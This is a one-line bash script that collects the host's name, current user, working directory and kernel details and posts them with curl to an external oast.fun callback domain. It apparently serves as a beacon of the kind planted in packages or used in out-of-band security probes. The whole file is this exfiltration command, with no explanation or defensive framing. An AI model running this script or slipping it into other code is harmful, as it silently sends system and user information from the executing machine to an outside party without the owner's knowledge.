#!/bin/bash

curl -H "Hostname: $(hostname)" -H "Whoami: $(whoami)" -H "Pwd: $(pwd)" -H "uname-a: $(uname -a)" -d $(uname)  http://newc.cderwc12vtc0000pa6cgggzcu3eyyyyyn.oast.fun
